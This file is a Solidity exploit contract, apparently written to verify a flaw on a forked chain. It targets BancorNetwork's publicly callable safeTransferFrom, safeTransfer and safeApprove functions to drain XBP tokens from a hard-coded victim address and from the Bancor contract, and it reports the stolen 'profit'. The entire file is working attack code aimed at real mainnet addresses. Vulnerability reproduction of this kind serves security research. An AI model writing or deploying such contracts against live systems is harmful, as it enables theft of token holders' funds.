// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

interface IBancorNetworkVuln {
    function safeApprove(address token, address spender, uint256 value) external;
    function safeTransfer(address token, address to, uint256 value) external;
    function safeTransferFrom(address token, address from, address to, uint256 value) external;
}

contract FlawVerifier {
    address internal constant BANCOR_NETWORK = 0x5f58058C0eC971492166763c8C22632B583F667f;
    address internal constant XBP = 0x28dee01D53FED0Edf5f6E310BF8Ef9311513Ae40;
    address internal constant VICTIM = 0xfd0B4DAa7bA535741E6B5Ba28Cba24F9a816E67E;

    IBancorNetworkVuln internal constant bancor = IBancorNetworkVuln(BANCOR_NETWORK);
    IERC20Like internal constant token = IERC20Like(XBP);

    bool public executed;

    constructor() {}

    function executeOnOpportunity() public {
        if (executed) {
            return;
        }
        executed = true;

        // Exploit path 1:
        // BancorNetwork.safeTransferFrom(token, victim, attacker, amount)
        // is publicly reachable, so any caller can pull from a victim that approved Bancor.
        uint256 approvedToBancor = token.allowance(VICTIM, BANCOR_NETWORK);
        uint256 victimBalance = token.balanceOf(VICTIM);
        uint256 drainableFromVictim = _min(approvedToBancor, victimBalance);
        if (drainableFromVictim > 0) {
            bancor.safeTransferFrom(XBP, VICTIM, address(this), drainableFromVictim);
        }

        // Exploit path 2:
        // BancorNetwork.safeTransfer(token, attacker, amount) is also public.
        // This stage is only feasible if BancorNetwork already holds XBP at the fork state.
        uint256 bancorBalance = token.balanceOf(BANCOR_NETWORK);
        if (bancorBalance > 0) {
            bancor.safeTransfer(XBP, address(this), bancorBalance);
        }

        // Exploit path 3:
        // BancorNetwork.safeApprove(token, attacker, allowance) can grant this verifier
        // allowance over BancorNetwork-held XBP, followed by ERC20.transferFrom.
        // If BancorNetwork holds no remaining XBP at runtime, this stage is mechanically
        // infeasible for XBP on this fork and is therefore skipped.
        uint256 remainingBancorBalance = token.balanceOf(BANCOR_NETWORK);
        if (remainingBancorBalance > 0) {
            bancor.safeApprove(XBP, address(this), remainingBancorBalance);
            token.transferFrom(BANCOR_NETWORK, address(this), remainingBancorBalance);
        }
    }

    function profitToken() external pure returns (address) {
        return XBP;
    }

    function profitAmount() external view returns (uint256) {
        return token.balanceOf(address(this));
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}
